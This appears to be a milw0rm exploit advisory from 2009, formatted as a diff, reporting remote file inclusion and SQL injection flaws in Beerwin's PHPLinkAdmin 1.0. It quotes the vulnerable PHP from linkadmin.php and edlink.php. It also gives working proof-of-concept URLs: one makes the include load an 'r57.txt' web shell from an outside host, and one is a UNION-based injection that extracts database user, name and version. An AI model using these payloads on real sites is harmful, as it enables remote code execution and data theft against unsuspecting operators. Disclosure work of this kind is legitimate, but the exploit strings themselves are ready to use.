@@ -1,0 +1,60 @@
+#######################################################################################################################
+[+] Beerwin's PHPLinkAdmin 1.0 Remote File Inclusion/SQL Injection
+[+] Discovered By SirGod
+[+] www.mortal-team.org
+[+] www.h4cky0u.org
+#######################################################################################################################
+
+[+] Download : http://www.downloads.beerwin.com/index.php?p=showdl&dl=16&cat=18
+
+[+] Remote File Inclusion
+
+ Direct acces to linkadmin.No auth.
+
+ Vulnerable code in linkadmin.php :
+
+-------------------------------------------------------------------------------------------
+$page = $_REQUEST['page'];
+if (!$page){
+echo "Welcome to the PHPLINKADMIN!.<br> Please select an action from
+the left menu.";
+}else{
+include $page;
+}
+--------------------------------------------------------------------------------------------
+
+ PoC :
+
+   http://127.0.0.1/path/linkadmin.php?page=http://www.kortech.cn/bbs//skin/zero_vote/r57.txt?
+
+========================================================================================================================
+
+[+] Remote SQL Injection
+
+  Is a lot of SQL Injection vulnerabilities in the script.I will
+present only one.
+
+  Vulnerable code in edlink.php :
+
+-----------------------------------------------------------------------------------------------
+$linkid=$_REQUEST['linkid'];
+if (!$linkid){
+  echo "Error: Link missing! <br />";
+}else{
+  $sql=mysql_query("SELECT * FROM linktable WHERE linkid='$linkid'")
+or die(mysql_error());
+-----------------------------------------------------------------------------------------------
+
+ PoC :
+
+   http://127.0.0.1/path/edlink.php?linkid=-1' union all select
+1,2,3,4,concat_ws(0x3a,user(),database(),version())'--
+
+ No important things to extract from database.
+
+=========================================================================================================================
+
+
+#######################################################################################################################
+
+# milw0rm.com [2009-03-16]
